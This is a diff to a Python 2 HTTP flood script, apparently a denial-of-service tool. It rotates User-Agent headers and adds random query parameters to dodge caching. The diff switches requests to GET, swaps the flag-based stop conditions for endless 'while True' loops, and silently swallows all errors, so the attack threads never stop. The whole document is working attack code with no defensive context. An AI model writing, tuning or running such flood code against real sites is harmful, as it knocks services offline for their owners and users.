@@ -88,7 +88,7 @@ def httpcall(url):
 	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Host',host)
-	request.get_method = lambda: "POST"
+	request.get_method = lambda: "GET"
 	try:
 			urllib2.urlopen(request)
 	except socket.error as e:
@@ -108,19 +108,19 @@ def httpcall(url):
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
-			while flag<2:
+			while True:
 				code=httpcall(url)
 				
 				
 					
-		except Exception, ex:
+		except:
 			pass
 
 # monitors http threads and counts requests
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
-		while flag==0:
+		while True:
 			if (previous+100<request_counter) & (previous<>request_counter):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
